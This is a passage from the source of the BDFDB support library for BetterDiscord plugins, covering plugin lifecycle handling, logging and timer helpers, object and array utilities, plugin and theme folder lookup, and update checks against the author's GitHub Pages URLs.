/**
 * @name BDFDB
 * @author DevilBro
 * @authorId 278543574059057154
 * @version 2.3.4
 * @description Required Library for DevilBro's Plugins
 * @invite Jx3TjNS
 * @donate https://www.paypal.me/MircoWittrien
 * @patreon https://www.patreon.com/MircoWittrien
 * @website https://mwittrien.github.io/
 * @source https://github.com/mwittrien/BetterDiscordAddons/tree/master/Library/
 * @updateUrl https://mwittrien.github.io/BetterDiscordAddons/Library/0BDFDB.plugin.js
 */

module.exports = (_ => {
	const BdApi = window.BdApi;
	
	const config = {
		"info": {
			"name": "BDFDB",
			"author": "DevilBro",
			"version": "2.3.4",
			"description": "Required Library for DevilBro's Plugins"
		},
		"rawUrl": "https://mwittrien.github.io/BetterDiscordAddons/Library/0BDFDB.plugin.js"
	};
	
	const Cache = {data: {}, modules: {}};
	
	var libraryInstance;
	var changeLogs = {};
	
	if (window.BDFDB_Global && window.BDFDB_Global.PluginUtils && typeof window.BDFDB_Global.PluginUtils.cleanUp == "function") {
		window.BDFDB_Global.PluginUtils.cleanUp(window.BDFDB_Global);
	}
	
	const BDFDB = {
		started: true
	};
	for (let key in config) key == "info" ? Object.assign(BDFDB, config[key]) : (BDFDB[key] = config[key]);
	
	const Internal = Object.assign({}, BDFDB, {
		patchPriority: 0,
		forceSyncData: true,
		settings: {},
		defaults: {
			general: {
				shareData: {
					value: true,
					onChange: _ => Cache.data = {}
				},
				showToasts: {
					value: true,
					isDisabled: data => data.nativeValue,
					hasNote: data => data.disabled && data.value
				},
				showSupportBadges: {
					value: true
				},
				useChromium: {
					value: false,
					isHidden: data => !Internal.LibraryRequires.electron || !Internal.LibraryRequires.electron.remote,
					getValue: data => !data.disabled
				}
			},
			choices: {
				toastPosition: {
					value: "right",
					items: "ToastPositions"
				}
			}
		},
	});
	for (let key in Internal.defaults) Internal.settings[key] = {};
	
	const LibraryConstants = {
		ToastIcons: {
			info: "INFO",
			danger: "CLOSE_CIRCLE",
			success: "CHECKMARK_CIRCLE",
			warning: "WARNING"
		},
		ToastPositions: {
			center: "toastscenter",
			left: "toastsleft",
			right: "toastsright"
		}
	};
	
	const PluginStores = {
		loaded: {},
		delayed: {
			loads: [],
			starts: []
		},
		updateData: {
			plugins: {},
			timeouts: [],
			downloaded: [],
			interval: null
		},
		patchQueues: {},
		chunkObserver: {},
		contextChunkObserver: {}
	};
	const Plugin = function(config) {
		return class Plugin {
			getName () {return config.info.name;}
			getAuthor () {return config.info.author;}
			getVersion () {return config.info.version;}
			getDescription () {return config.info.description;}
			load () {
				this.loaded = true;
				this.defaults = {};
				this.labels = {};
				if (window.BDFDB_Global.loading) {
					if (!PluginStores.delayed.loads.includes(this)) PluginStores.delayed.loads.push(this);
				}
				else {
					Object.assign(this, config.info, BDFDB.ObjectUtils.exclude(config, "info"));
					BDFDB.TimeUtils.suppress(_ => {
						PluginStores.loaded[config.info.name] = this;
						BDFDB.PluginUtils.load(this);
						if (typeof this.onLoad == "function") this.onLoad();
					}, "Failed to load Plugin!", config.info)();
				}
			}
			start () {
				if (!this.loaded) this.load();
				if (window.BDFDB_Global.loading) {
					if (!PluginStores.delayed.starts.includes(this)) PluginStores.delayed.starts.push(this);
				}
				else {
					if (this.started) return;
					this.started = true;
					BDFDB.TimeUtils.suppress(_ => {
						BDFDB.PluginUtils.init(this);
						if (typeof this.onStart == "function") this.onStart();
					}, "Failed to start Plugin!", config.info)();
					delete this.stopping;
				}
			}
			stop () {
				if (window.BDFDB_Global.loading) {
					if (PluginStores.delayed.starts.includes(this)) PluginStores.delayed.starts.splice(PluginStores.delayed.starts.indexOf(this), 1);
				}
				else {
					if (this.stopping) return;
					this.stopping = true;
					BDFDB.TimeUtils.timeout(_ => {delete this.stopping;});
					
					BDFDB.TimeUtils.suppress(_ => {
						if (typeof this.onStop == "function") this.onStop();
						BDFDB.PluginUtils.clear(this);
					}, "Failed to stop Plugin!", config.info)();

					delete this.started;
				}
			}
		};
	};

	BDFDB.LogUtils = {};
	Internal.console = function (type, config = {}) {
		if (!console[type]) return;
		let name, version;
		if (typeof config.name == "string" && config.name) {
			name = config.name;
			version = typeof config.version == "string" ? config.version : "";
		}
		else {
			name = BDFDB.name;
			version = BDFDB.version;
		}
		console[type](...[[name && `%c[${name}]`, version && `%c(v${version})`].filter(n => n).join(" "), name && "color: #3a71c1; font-weight: 700;", version && "color: #666; font-weight: 600; font-size: 11px;", [config.strings].flat(10).filter(n => n).join(" ").trim()].filter(n => n));
	};
	BDFDB.LogUtils.log = function (strings, config = {}) {
		Internal.console("log", Object.assign({}, config, {name: typeof config == "string" ? config : config.name, strings}));
	};
	BDFDB.LogUtils.warn = function (strings, config = {}) {
		Internal.console("warn", Object.assign({}, config, {name: typeof config == "string" ? config : config.name, strings}));
	};
	BDFDB.LogUtils.error = function (strings, config = {}) {
		Internal.console("error", Object.assign({}, config, {name: typeof config == "string" ? config : config.name, strings: ["Fatal Error:", strings]}));
	};

	BDFDB.TimeUtils = {};
	BDFDB.TimeUtils.interval = function (callback, delay, ...args) {
		if (typeof callback != "function" || typeof delay != "number" || delay < 1) return;
		else {
			let count = 0, interval = setInterval(_ => BDFDB.TimeUtils.suppress(callback, "Interval")(...[interval, count++, args].flat()), delay);
			return interval;
		}
	};
	BDFDB.TimeUtils.timeout = function (callback, delay, ...args) {
		delay = parseFloat(delay);
		if (typeof callback != "function") return;
		if (isNaN(delay) || typeof delay != "number" || delay < 1) {
			let immediate = setImmediate(_ => BDFDB.TimeUtils.suppress(callback, "Immediate")(...[immediate, args].flat()));
			return immediate;
		}
		else {
			let start, paused = true, timeout = {
				pause: _ => {
					if (paused) return;
					paused = true;
					BDFDB.TimeUtils.clear(timeout.timer);
					delay -= performance.now() - start;
				},
				resume: _ => {
					if (!paused) return;
					paused = false;
					start = performance.now();
					timeout.timer = setTimeout(_ => BDFDB.TimeUtils.suppress(callback, "Timeout")(...[timeout, args].flat()), delay)
				}
			};
			timeout.resume();
			return timeout;
		}
	};
	BDFDB.TimeUtils.clear = function (...timeObjects) {
		for (let t of timeObjects.flat(10).filter(n => n)) {
			t = t.timer != undefined ? t.timer : t;
			if (typeof t == "number") {
				clearInterval(t);
				clearTimeout(t);
			}
			else if (typeof t == "object") clearImmediate(t);
		}
	};
	BDFDB.TimeUtils.suppress = function (callback, strings, config) {return function (...args) {
		try {return callback(...args);}
		catch (err) {BDFDB.LogUtils.error([strings, err], config);}
	}};

	BDFDB.LogUtils.log("Loading Library");

	BDFDB.sameProto = function (a, b) {
		if (a != null && typeof a == "object") return a.constructor && a.constructor.prototype && typeof a.constructor.prototype.isPrototypeOf == "function" && a.constructor.prototype.isPrototypeOf(b);
		else return typeof a == typeof b;
	};
	BDFDB.equals = function (mainA, mainB, sorted) {
		let i = -1;
		if (sorted === undefined || typeof sorted !== "boolean") sorted = false;
		return equal(mainA, mainB);
		function equal(a, b) {
			i++;
			let result = true;
			if (i > 1000) result = null;
			else {
				if (typeof a !== typeof b) result = false;
				else if (typeof a == "function") result = a.toString() == b.toString();
				else if (typeof a === "undefined") result = true;
				else if (typeof a === "symbol") result = true;
				else if (typeof a === "boolean") result = a == b;
				else if (typeof a === "string") result = a == b;
				else if (typeof a === "number") {
					if (isNaN(a) || isNaN(b)) result = isNaN(a) == isNaN(b);
					else result = a == b;
				}
				else if (!a && !b) result = true;
				else if (!a || !b) result = false;
				else if (typeof a === "object") {
					let keysA = Object.getOwnPropertyNames(a);
					let keysB = Object.getOwnPropertyNames(b);
					if (keysA.length !== keysB.length) result = false;
					else for (let j = 0; result === true && j < keysA.length; j++) {
						if (sorted) result = equal(a[keysA[j]], b[keysB[j]]);
						else result = equal(a[keysA[j]], b[keysA[j]]);
					}
				}
			}
			i--;
			return result;
		}
	};

	BDFDB.ObjectUtils = {};
	BDFDB.ObjectUtils.is = function (obj) {
		return obj && !Array.isArray(obj) && !Set.prototype.isPrototypeOf(obj) && (typeof obj == "function" || typeof obj == "object");
	};
	BDFDB.ObjectUtils.get = function (nodeOrObj, valuePath) {
		if (!nodeOrObj || !valuePath) return null;
		let obj = Node.prototype.isPrototypeOf(nodeOrObj) ? BDFDB.ReactUtils.getInstance(nodeOrObj) : nodeOrObj;
		if (!BDFDB.ObjectUtils.is(obj)) return null;
		let found = obj;
		for (const value of valuePath.split(".").filter(n => n)) {
			if (!found) return null;
			found = found[value];
		}
		return found;
	};
	BDFDB.ObjectUtils.extract = function (obj, ...keys) {
		let newObj = {};
		if (BDFDB.ObjectUtils.is(obj)) for (let key of keys.flat(10).filter(n => n)) if (obj[key] != null) newObj[key] = obj[key];
		return newObj;
	};
	BDFDB.ObjectUtils.exclude = function (obj, ...keys) {
		let newObj = Object.assign({}, obj);
		BDFDB.ObjectUtils.delete(newObj, ...keys)
		return newObj;
	};
	BDFDB.ObjectUtils.delete = function (obj, ...keys) {
		if (BDFDB.ObjectUtils.is(obj)) for (let key of keys.flat(10).filter(n => n)) delete obj[key];
	};
	BDFDB.ObjectUtils.sort = function (obj, sort, except) {
		if (!BDFDB.ObjectUtils.is(obj)) return {};
		let newObj = {};
		if (sort === undefined || !sort) for (let key of Object.keys(obj).sort()) newObj[key] = obj[key];
		else {
			let values = [];
			for (let key in obj) values.push(obj[key]);
			values = BDFDB.ArrayUtils.keySort(values, sort, except);
			for (let value of values) for (let key in obj) if (BDFDB.equals(value, obj[key])) {
				newObj[key] = value;
				break;
			}
		}
		return newObj;
	};
	BDFDB.ObjectUtils.group = function (obj, key) {
		if (!BDFDB.ObjectUtils.is(obj)) return {};
		if (typeof key != "string") return obj;
		return Object.entries(obj).reduce((newObj, objPair) => {
			if (!newObj[objPair[1][key]]) newObj[objPair[1][key]] = {};
			newObj[objPair[1][key]][objPair[0]] = objPair[1];
			return newObj;
		}, {});
	};
	BDFDB.ObjectUtils.reverse = function (obj, sort) {
		if (!BDFDB.ObjectUtils.is(obj)) return {};
		let newObj = {};
		for (let key of (sort === undefined || !sort) ? Object.keys(obj).reverse() : Object.keys(obj).sort().reverse()) newObj[key] = obj[key];
		return newObj;
	};
	BDFDB.ObjectUtils.filter = function (obj, filter, byKey = false) {
		if (!BDFDB.ObjectUtils.is(obj)) return {};
		if (typeof filter != "function") return obj;
		return Object.keys(obj).filter(key => filter(byKey ? key : obj[key])).reduce((newObj, key) => (newObj[key] = obj[key], newObj), {});
	};
	BDFDB.ObjectUtils.push = function (obj, value) {
		if (BDFDB.ObjectUtils.is(obj)) obj[Object.keys(obj).length] = value;
	};
	BDFDB.ObjectUtils.pop = function (obj, value) {
		if (BDFDB.ObjectUtils.is(obj)) {
			let keys = Object.keys(obj);
			if (!keys.length) return;
			let value = obj[keys[keys.length-1]];
			delete obj[keys[keys.length-1]];
			return value;
		}
	};
	BDFDB.ObjectUtils.map = function (obj, mapFunc) {
		if (!BDFDB.ObjectUtils.is(obj)) return {};
		if (typeof mapFunc != "string" && typeof mapFunc != "function") return obj;
		let newObj = {};
		for (let key in obj) if (BDFDB.ObjectUtils.is(obj[key])) newObj[key] = typeof mapFunc == "string" ? obj[key][mapFunc] : mapFunc(obj[key], key);
		return newObj;
	};
	BDFDB.ObjectUtils.toArray = function (obj) {
		if (!BDFDB.ObjectUtils.is(obj)) return [];
		return Object.entries(obj).map(n => n[1]);
	};
	BDFDB.ObjectUtils.deepAssign = function (obj, ...objs) {
		if (!objs.length) return obj;
		let nextObj = objs.shift();
		if (BDFDB.ObjectUtils.is(obj) && BDFDB.ObjectUtils.is(nextObj)) {
			for (let key in nextObj) {
				if (BDFDB.ObjectUtils.is(nextObj[key])) {
					if (!obj[key]) Object.assign(obj, {[key]:{}});
					BDFDB.ObjectUtils.deepAssign(obj[key], nextObj[key]);
				}
				else Object.assign(obj, {[key]:nextObj[key]});
			}
		}
		return BDFDB.ObjectUtils.deepAssign(obj, ...objs);
	};
	BDFDB.ObjectUtils.isEmpty = function (obj) {
		return !BDFDB.ObjectUtils.is(obj) || Object.getOwnPropertyNames(obj).length == 0;
	};
	BDFDB.ObjectUtils.mirror = function (obj) {
		if (!BDFDB.ObjectUtils.is(obj)) return {};
		let newObj = Object.assign({}, obj);
		for (let key in newObj) if (newObj[newObj[key]] == undefined && (typeof key == "number" || typeof key == "string")) newObj[newObj[key]] = key;
		return newObj;
	};

	BDFDB.ArrayUtils = {};
	BDFDB.ArrayUtils.is = function (array) {
		return array && Array.isArray(array);
	};
	BDFDB.ArrayUtils.sum = function (array) {
		return Array.isArray(array) ? array.reduce((total, num) => total + Math.round(num), 0) : 0;
	};
	BDFDB.ArrayUtils.keySort = function (array, key, except) {
		if (!BDFDB.ArrayUtils.is(array)) return [];
		if (key == null) return array;
		if (except === undefined) except = null;
		return array.sort((x, y) => {
			let xValue = x[key], yValue = y[key];
			if (xValue !== except) return xValue < yValue ? -1 : xValue > yValue ? 1 : 0;
		});
	};
	BDFDB.ArrayUtils.numSort = function (array) {
		return array.sort((x, y) => (x < y ? -1 : x > y ? 1 : 0));
	};
	BDFDB.ArrayUtils.includes = function (array, ...values) {
		if (!BDFDB.ArrayUtils.is(array)) return null;
		if (!array.length) return false;
		let all = values.pop();
		if (typeof all != "boolean") {
			values.push(all);
			all = true;
		}
		if (!values.length) return false;
		let contained = undefined;
		for (let v of values) {
			if (contained === undefined) contained = all;
			if (all && !array.includes(v)) contained = false;
			if (!all && array.includes(v)) contained = true;
		}
		return contained;
	};
	BDFDB.ArrayUtils.remove = function (array, value, all = false) {
		if (!BDFDB.ArrayUtils.is(array)) return [];
		if (!array.includes(value)) return array;
		if (!all) array.splice(array.indexOf(value), 1);
		else while (array.indexOf(value) > -1) array.splice(array.indexOf(value), 1);
		return array;
	};
	BDFDB.ArrayUtils.getAllIndexes = function (array, value) {
		if (!BDFDB.ArrayUtils.is(array) && typeof array != "string") return [];
		var indexes = [], index = -1;
		while ((index = array.indexOf(value, index + 1)) !== -1) indexes.push(index);
		return indexes;
	};
	BDFDB.ArrayUtils.removeCopies = function (array) {
		if (!BDFDB.ArrayUtils.is(array)) return [];
		return [...new Set(array)];
	};

	BDFDB.BDUtils = {};
	BDFDB.BDUtils.getPluginsFolder = function () {
		if (BdApi && BdApi.Plugins && BdApi.Plugins.folder && typeof BdApi.Plugins.folder == "string") return BdApi.Plugins.folder;
		else if (Internal.LibraryRequires.process.env.BETTERDISCORD_DATA_PATH) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.BETTERDISCORD_DATA_PATH, "plugins/");
		else if (Internal.LibraryRequires.process.env.injDir) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.injDir, "plugins/");
		else switch (Internal.LibraryRequires.process.platform) {
			case "win32":
				return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.appdata, "BetterDiscord/plugins/");
			case "darwin":
				return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.HOME, "Library/Preferences/BetterDiscord/plugins/");
			default:
				if (Internal.LibraryRequires.process.env.XDG_CONFIG_HOME) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.XDG_CONFIG_HOME, "BetterDiscord/plugins/");
				else if (Internal.LibraryRequires.process.env.HOME) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.HOME, ".config/BetterDiscord/plugins/");
				else return "";
			}
	};
	BDFDB.BDUtils.getThemesFolder = function () {
		if (BdApi && BdApi.Themes && BdApi.Themes.folder && typeof BdApi.Themes.folder == "string") return BdApi.Themes.folder;
		else if (Internal.LibraryRequires.process.env.BETTERDISCORD_DATA_PATH) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.BETTERDISCORD_DATA_PATH, "themes/");
		else if (Internal.LibraryRequires.process.env.injDir) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.injDir, "plugins/");
		else switch (Internal.LibraryRequires.process.platform) {
			case "win32": 
				return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.appdata, "BetterDiscord/themes/");
			case "darwin": 
				return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.HOME, "Library/Preferences/BetterDiscord/themes/");
			default:
				if (Internal.LibraryRequires.process.env.XDG_CONFIG_HOME) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.XDG_CONFIG_HOME, "BetterDiscord/themes/");
				else if (Internal.LibraryRequires.process.env.HOME) return Internal.LibraryRequires.path.resolve(Internal.LibraryRequires.process.env.HOME, ".config/BetterDiscord/themes/");
				else return "";
			}
	};
	BDFDB.BDUtils.isPluginEnabled = function (pluginName) {
		if (!BdApi) return null;
		else if (BdApi.Plugins && typeof BdApi.Plugins.isEnabled == "function") return BdApi.Plugins.isEnabled(pluginName);
		else if (typeof BdApi.isPluginEnabled == "function") return BdApi.isPluginEnabled(pluginName);
	};
	BDFDB.BDUtils.reloadPlugin = function (pluginName) {
		if (!BdApi) return;
		else if (BdApi.Plugins && typeof BdApi.Plugins.reload == "function") BdApi.Plugins.reload(pluginName);
		else if (window.pluginModule) window.pluginModule.reloadPlugin(pluginName);
	};
	BDFDB.BDUtils.enablePlugin = function (pluginName) {
		if (!BdApi) return;
		else if (BdApi.Plugins && typeof BdApi.Plugins.enable == "function") BdApi.Plugins.enable(pluginName);
		else if (window.pluginModule) window.pluginModule.startPlugin(pluginName);
	};
	BDFDB.BDUtils.disablePlugin = function (pluginName) {
		if (!BdApi) return;
		else if (BdApi.Plugins && typeof BdApi.Plugins.disable == "function") BdApi.Plugins.disable(pluginName);
		else if (window.pluginModule) window.pluginModule.stopPlugin(pluginName);
	};
	BDFDB.BDUtils.getPlugin = function (pluginName, hasToBeEnabled = false, overHead = false) {
		if (BdApi && !hasToBeEnabled || BDFDB.BDUtils.isPluginEnabled(pluginName)) {	
			if (BdApi.Plugins && typeof BdApi.Plugins.get == "function") {
				let plugin = BdApi.Plugins.get(pluginName);
				if (!plugin) return null;
				if (overHead) return plugin.filename && plugin.exports && plugin.instance ? plugin : {filename: Internal.LibraryRequires.fs.existsSync(Internal.LibraryRequires.path.join(BDFDB.BDUtils.getPluginsFolder(), `${pluginName}.plugin.js`)) ? `${pluginName}.plugin.js` : null, id: pluginName, name: pluginName, plugin: plugin};
				else return plugin.filename && plugin.exports && plugin.instance ? plugin.instance : plugin;
			}
			else if (window.bdplugins) overHead ? window.bdplugins[pluginName] : (window.bdplugins[pluginName] || {}).plugin;
		}
		return null;
	};
	BDFDB.BDUtils.isThemeEnabled = function (themeName) {
		if (!BdApi) return null;
		else if (BdApi.Themes && typeof BdApi.Themes.isEnabled == "function") return BdApi.Themes.isEnabled(themeName);
		else if (typeof BdApi.isThemeEnabled == "function") return BdApi.isThemeEnabled(themeName);
	};
	BDFDB.BDUtils.enableTheme = function (themeName) {
		if (!BdApi) return;
		else if (BdApi.Themes && typeof BdApi.Themes.enable == "function") BdApi.Themes.enable(themeName);
		else if (window.themeModule) window.themeModule.enableTheme(themeName);
	};
	BDFDB.BDUtils.disableTheme = function (themeName) {
		if (!BdApi) return;
		else if (BdApi.Themes && typeof BdApi.Themes.disable == "function") BdApi.Themes.disable(themeName);
		else if (window.themeModule) window.themeModule.disableTheme(themeName);
	};
	BDFDB.BDUtils.getTheme = function (themeName, hasToBeEnabled = false) {
		if (BdApi && !hasToBeEnabled || BDFDB.BDUtils.isThemeEnabled(themeName)) {
			if (BdApi.Themes && typeof BdApi.Themes.get == "function") return BdApi.Themes.get(themeName);
			else if (window.bdthemes) window.bdthemes[themeName];
		}
		return null;
	};
	BDFDB.BDUtils.settingsIds = {
		automaticLoading: "settings.addons.autoReload",
		coloredText: "settings.appearance.coloredText",
		normalizedClasses: "settings.general.classNormalizer",
		showToasts: "settings.general.showToasts"
	};
	BDFDB.BDUtils.toggleSettings = function (key, state) {
		if (BdApi && typeof key == "string") {
			let path = key.split(".");
			let currentState = BDFDB.BDUtils.getSettings(key);
			if (state === true) {
				if (currentState === false && typeof BdApi.enableSetting == "function") BdApi.enableSetting(...path);
			}
			else if (state === false) {
				if (currentState === true && typeof BdApi.disableSetting == "function") BdApi.disableSetting(...path);
			}
			else if (currentState === true || currentState === false) BDFDB.BDUtils.toggleSettings(key, !currentState);
		}
	};
	BDFDB.BDUtils.getSettings = function (key) {
		if (!BdApi) return {};
		if (typeof key == "string") return typeof BdApi.isSettingEnabled == "function" && BdApi.isSettingEnabled(...key.split("."));
		else return BDFDB.ArrayUtils.is(BdApi.settings) ? BdApi.settings.map(n => n.settings.map(m => m.settings.map(l => ({id: [n.id, m.id, l.id].join("."), value: l.value})))).flat(10).reduce((newObj, setting) => (newObj[setting.id] = setting.value, newObj), {}) : {};
	};
	BDFDB.BDUtils.getSettingsProperty = function (property, key) {
		if (!BdApi || !BDFDB.ArrayUtils.is(BdApi.settings)) return key ? "" : {};
		else {
			let settingsMap = BdApi.settings.map(n => n.settings.map(m => m.settings.map(l => ({id: [n.id, m.id, l.id].join("."), value: l[property]})))).flat(10).reduce((newObj, setting) => (newObj[setting.id] = setting.value, newObj), {});
			return key ? (settingsMap[key] != null ? settingsMap[key] : "") : "";
		}
	};
	
	
	BDFDB.PluginUtils = {};
	BDFDB.PluginUtils.buildPlugin = function (config) {
		return [Plugin(config), BDFDB];
	};
	BDFDB.PluginUtils.load = function (plugin) {
		if (!PluginStores.updateData.timeouts.includes(plugin.name)) {
			PluginStores.updateData.timeouts.push(plugin.name);
			const url = Internal.getPluginURL(plugin);

			PluginStores.updateData.plugins[url] = {name: plugin.name, raw: url, version: plugin.version};
			
			BDFDB.PluginUtils.checkUpdate(plugin.name, url);
			
			if (!PluginStores.updateData.interval) PluginStores.updateData.interval = BDFDB.TimeUtils.interval(_ => {
				BDFDB.PluginUtils.checkAllUpdates();
			}, 1000*60*60*4);
			
			BDFDB.TimeUtils.timeout(_ => BDFDB.ArrayUtils.remove(PluginStores.updateData.timeouts, plugin.name, true), 30000);
		}
	};
	BDFDB.PluginUtils.init = function (plugin) {
		BDFDB.PluginUtils.load(plugin);
		
		plugin.settings = BDFDB.DataUtils.get(plugin);
		
		BDFDB.LogUtils.log(BDFDB.LanguageUtils.LibraryStringsFormat("toast_plugin_started", ""), plugin);
		if (Internal.settings.general.showToasts && !BDFDB.BDUtils.getSettings(BDFDB.BDUtils.settingsIds.showToasts)) BDFDB.NotificationUtils.toast(BDFDB.LanguageUtils.LibraryStringsFormat("toast_plugin_started", `${plugin.name} v${plugin.version}`), {
			disableInteractions: true,
			barColor: BDFDB.DiscordConstants.Colors.STATUS_GREEN
		});
		
		if (plugin.css) BDFDB.DOMUtils.appendLocalStyle(plugin.name, plugin.css);
		
		Internal.patchPlugin(plugin);
		Internal.addQueuePatches(plugin);
		Internal.addContextChunkObservers(plugin);

		BDFDB.PluginUtils.translate(plugin);

		BDFDB.PluginUtils.checkChangeLog(plugin);
	};
	BDFDB.PluginUtils.clear = function (plugin) {
		BDFDB.LogUtils.log(BDFDB.LanguageUtils.LibraryStringsFormat("toast_plugin_stopped", ""), plugin);
		if (Internal.settings.general.showToasts && !BDFDB.BDUtils.getSettings(BDFDB.BDUtils.settingsIds.showToasts)) BDFDB.NotificationUtils.toast(BDFDB.LanguageUtils.LibraryStringsFormat("toast_plugin_stopped", `${plugin.name} v${plugin.version}`), {
			disableInteractions: true,
			barColor: BDFDB.DiscordConstants.Colors.STATUS_RED
		});
		
		const url = Internal.getPluginURL(plugin);

		BDFDB.PluginUtils.cleanUp(plugin);
		
		for (const type in PluginStores.patchQueues) BDFDB.ArrayUtils.remove(PluginStores.patchQueues[type].query, plugin, true);
		for (const type in PluginStores.chunkObserver) BDFDB.ArrayUtils.remove(PluginStores.chunkObserver[type].query, plugin, true);
		for (const type in PluginStores.contextChunkObserver) BDFDB.ArrayUtils.remove(PluginStores.contextChunkObserver[type].query, plugin, true);
		
		for (const modal of document.querySelectorAll(`.${plugin.name}-modal, .${plugin.name.toLowerCase()}-modal, .${plugin.name}-settingsmodal, .${plugin.name.toLowerCase()}-settingsmodal`)) {
			const closeButton = modal.querySelector(BDFDB.dotCN.modalclose);
			if (closeButton) closeButton.click();
		}
		
		delete Cache.data[plugin.name]
		delete PluginStores.updateData.plugins[url];
	};
	BDFDB.PluginUtils.translate = function (plugin) {
		if (typeof plugin.setLabelsByLanguage == "function" || typeof plugin.changeLanguageStrings == "function") {
			const translate = _ => {
				if (typeof plugin.setLabelsByLanguage == "function") plugin.labels = plugin.setLabelsByLanguage();
				if (typeof plugin.changeLanguageStrings == "function") plugin.changeLanguageStrings();
			};
			if (Internal.LibraryModules.LanguageStore.chosenLocale || Internal.LibraryModules.LanguageStore._chosenLocale || BDFDB.DicordUtils.getSettings("locale")) translate();
			else BDFDB.TimeUtils.interval(interval => {
				if (Internal.LibraryModules.LanguageStore.chosenLocale || Internal.LibraryModules.LanguageStore._chosenLocale || BDFDB.DicordUtils.getSettings("locale")) {
					BDFDB.TimeUtils.clear(interval);
					translate();
				}
			}, 100);
		}
	};
	BDFDB.PluginUtils.cleanUp = function (plugin) {
		BDFDB.TimeUtils.suppress(_ => {
			if (!BDFDB.ObjectUtils.is(plugin)) return;
			if (plugin == window.BDFDB_Global) {
				if (Internal.removeChunkObserver) Internal.removeChunkObserver();
				let updateNotice = BDFDB.dotCN && document.querySelector(BDFDB.dotCN.noticeupdate);
				if (updateNotice) updateNotice.close();
				BDFDB.TimeUtils.clear(PluginStores && PluginStores.updateData && PluginStores.updateData.interval);
				delete window.BDFDB_Global.loaded;
				if (PluginStores) BDFDB.TimeUtils.interval((interval, count) => {
					if (count > 60 || window.BDFDB_Global.loaded) BDFDB.TimeUtils.clear(interval);
					if (window.BDFDB_Global.loaded) for (let pluginName in BDFDB.ObjectUtils.sort(PluginStores.loaded)) BDFDB.TimeUtils.timeout(_ => {
						if (PluginStores.loaded[pluginName].started) BDFDB.BDUtils.reloadPlugin(pluginName);
					});
				}, 1000);
			}
			if (BDFDB.DOMUtils && BDFDB.DOMUtils.removeLocalStyle) BDFDB.DOMUtils.removeLocalStyle(plugin.name);
			if (BDFDB.ListenerUtils && BDFDB.ListenerUtils.remove) BDFDB.ListenerUtils.remove(plugin);
			if (BDFDB.ListenerUtils && BDFDB.ListenerUtils.removeGlobal) BDFDB.ListenerUtils.removeGlobal(plugin);
			if (BDFDB.StoreChangeUtils && BDFDB.StoreChangeUtils.remove) BDFDB.StoreChangeUtils.remove(plugin);
			if (BDFDB.ObserverUtils && BDFDB.ObserverUtils.disconnect) BDFDB.ObserverUtils.disconnect(plugin);
			if (BDFDB.PatchUtils && BDFDB.PatchUtils.unpatch) BDFDB.PatchUtils.unpatch(plugin);
			if (BDFDB.WindowUtils && BDFDB.WindowUtils.closeAll) BDFDB.WindowUtils.closeAll(plugin);
			if (BDFDB.WindowUtils && BDFDB.WindowUtils.removeListener) BDFDB.WindowUtils.removeListener(plugin);
		}, "Failed to clean up Plugin!", plugin)();
	};
	BDFDB.PluginUtils.checkUpdate = function (pluginName, url) {
		if (pluginName && url && PluginStores.updateData.plugins[url]) return new Promise(callback => {
			Internal.LibraryRequires.request(url, (error, response, body) => {
				if (error || !PluginStores.updateData.plugins[url]) return callback(null);
				let newName = (body.match(/"name"\s*:\s*"([^"]+)"/) || [])[1] || pluginName;
				let newVersion = (body.match(/@version ([0-9]+\.[0-9]+\.[0-9]+)|['"]([0-9]+\.[0-9]+\.[0-9]+)['"]/i) || []).filter(n => n)[1];
				if (!newVersion) return callback(null);
				if (pluginName == newName && BDFDB.NumberUtils.getVersionDifference(newVersion, PluginStores.updateData.plugins[url].version) > 0.2) {
					BDFDB.NotificationUtils.toast(BDFDB.LanguageUtils.LibraryStringsFormat("toast_plugin_force_updated", pluginName), {
						type: "warning",
						disableInteractions: true
					});
					BDFDB.PluginUtils.downloadUpdate(pluginName, url);
					return callback(2);
				}
				else if (BDFDB.NumberUtils.compareVersions(newVersion, PluginStores.updateData.plugins[url].version)) {
					if (PluginStores.updateData.plugins[url]) PluginStores.updateData.plugins[url].outdated = true;
					BDFDB.PluginUtils.showUpdateNotice(pluginName, url);
					return callback(1);
				}
				else {
					BDFDB.PluginUtils.removeUpdateNotice(pluginName);
					return callback(0);
				}
			});
		});
		return new Promise(callback => callback(null));
	};
	BDFDB.PluginUtils.checkAllUpdates = function () {
		return new Promise(callback => {
			let finished = 0, amount = 0;
			for (let url in PluginStores.updateData.plugins) {
				let plugin = PluginStores.updateData.plugins[url];
				if (plugin) BDFDB.PluginUtils.checkUpdate(plugin.name, plugin.raw).then(state => {
					finished++;
					if (state == 1) amount++;
					if (finished >= Object.keys(PluginStores.updateData.plugins).length) callback(amount);
				});
			}
		});
	};
	BDFDB.PluginUtils.hasUpdateCheck = function (url) {
		if (!url || typeof url != "string") return false;
		let updateStore = Object.assign({}, window.PluginUpdates && window.PluginUpdates.plugins, PluginStores.updateData.plugins);
		if (updateStore[url]) return true;
		else {
			let temp = url.replace("//raw.githubusercontent.com", "//").split("/");
			let gitName = temp.splice(3, 1);
			temp.splice(4, 1);
			temp.splice(2, 1, gitName + ".github.io");
			let pagesUrl = temp.join("/");
			return !!updateStore[pagesUrl];
		}
	};
	BDFDB.PluginUtils.showUpdateNotice = function (pluginName, url) {
		if (!pluginName || !url) return;
		let updateNotice = document.querySelector(BDFDB.dotCN.noticeupdate);
		if (!updateNotice) {
			let vanishObserver = new MutationObserver(changes => {
				if (!document.contains(updateNotice)) {
					if (updateNotice.querySelector(BDFDB.dotCN.noticeupdateentry)) {
						let layers = document.querySelector(BDFDB.dotCN.layers) || document.querySelector(BDFDB.dotCN.appmount);
						if (layers) layers.parentElement.insertBefore(updateNotice, layers);
					}
					else vanishObserver.disconnect();
				}
				else if (document.contains(updateNotice) && !updateNotice.querySelector(BDFDB.dotCNC.noticeupdateentry + BDFDB.dotCN.noticebutton)) vanishObserver.disconnect();
			});
